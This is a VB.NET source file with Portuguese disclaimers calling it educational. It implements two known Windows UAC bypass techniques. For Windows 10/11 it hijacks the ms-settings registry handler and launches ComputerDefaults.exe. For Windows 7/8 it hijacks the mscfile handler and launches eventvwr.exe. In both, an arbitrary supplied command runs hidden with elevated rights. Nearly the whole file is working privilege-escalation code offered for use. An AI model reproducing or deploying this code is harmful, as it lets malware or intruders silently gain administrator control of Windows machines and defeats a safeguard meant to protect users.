﻿

'!!!!!!!!!!!! Atenção codigo feito com propócito educativo !!!!!!!!!!!!!!
'!!!!!!!!!!!! Não me responsabiliso pelos seus atos !!!!!!!!!!!!!!!!!!!!!
'!!!!!!!!!!!! Apenas para proposito educativos "educacionais" '!!!!!!!!!!
'!!!!!!!!!!!! Use de forma correta perante a lei! Por favor !!!!!!!!!!!!!


Imports System.Security.Principal
Imports Microsoft.Win32
Imports Microsoft.MicrosoftClass.Microsoft

Namespace Bypass_UACClass
    Class Bypass_UAC

        Public Shared Function IsAdmin() As Boolean
            Try
                Dim id As WindowsIdentity = WindowsIdentity.GetCurrent()
                Dim p As New WindowsPrincipal(id)
                Return p.IsInRole(WindowsBuiltInRole.Administrator)
            Catch ex As Exception
            End Try
            Return False
        End Function

        Public Shared DirUAC As String = (System32 & "\cmd.exe /c ")

        Public Shared Sub win10_11UACbypass(ByVal s As String)
            'Artigo: https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/

            Dim Creat As RegistryKey = Nothing

            Try 'creat folde
                Creat = Registry.CurrentUser.OpenSubKey("Software\Classes", True)

                With Creat
                    .CreateSubKey("ms-settings")
                    Call .Close()
                    Call .Dispose()
                End With
                Creat = Registry.CurrentUser.OpenSubKey("Software\Classes\ms-settings", True)
                With Creat
                    .CreateSubKey("Shell")
                    Call .Close()
                    Call .Dispose()
                End With
                Creat = Registry.CurrentUser.OpenSubKey("Software\Classes\ms-settings\Shell", True)
                With Creat
                    .CreateSubKey("Open")
                    Call .Close()
                    Call .Dispose()
                End With
                Creat = Registry.CurrentUser.OpenSubKey("Software\Classes\ms-settings\Shell\Open", True)
                With Creat
                    .CreateSubKey("command")
                    Call .Close()
                    Call .Dispose()
                End With
            Catch ex As Exception
            End Try

            'add key reg 01
            Shell(Dir & "REG ADD HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command /t REG_SZ /f /d """ & s & """", AppWinStyle.Hide)

            'add key reg 02
            Shell(Dir & "REG ADD HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command /t REG_SZ /f /v DelegateExecute", AppWinStyle.Hide)

            'Start
            Shell(Dir() & "ping 127.0.0.1 -n 5 & start " & """" & System32 & "\ComputerDefaults.exe" & """", AppWinStyle.Hide)
        End Sub

        Public Shared Sub win7_Win8_UACbypass(ByVal s As String)
            Dim Creat As RegistryKey = Nothing

            Try 'creat folde
                Creat = Registry.CurrentUser.OpenSubKey("Software\Classes", True)
                With Creat
                    .CreateSubKey("mscfile")
                    Call .Close()
                    Call .Dispose()
                End With
                Creat = Registry.CurrentUser.OpenSubKey("Software\Classes\mscfile", True)
                With Creat
                    .CreateSubKey("Shell")
                    Call .Close()
                    Call .Dispose()
                End With
                Creat = Registry.CurrentUser.OpenSubKey("Software\Classes\mscfile\Shell", True)
                With Creat
                    .CreateSubKey("Open")
                    Call .Close()
                    Call .Dispose()
                End With
                Creat = Registry.CurrentUser.OpenSubKey("Software\Classes\mscfile\Shell\Open", True)
                With Creat
                    .CreateSubKey("command")
                    Call .Close()
                    Call .Dispose()
                End With
            Catch ex As Exception
            End Try

            'add key reg 01
            Shell(Dir & "REG ADD HKEY_CURRENT_USER\Software\Classes\mscfile\Shell\Open\command /t REG_SZ /f /d """ & s & """", AppWinStyle.Hide)

            'Start
            Shell(Dir() & "ping 127.0.0.1 -n 5 & start " & """" & System32 & "\eventvwr.exe" & """", AppWinStyle.Hide)
        End Sub
    End Class

End Namespace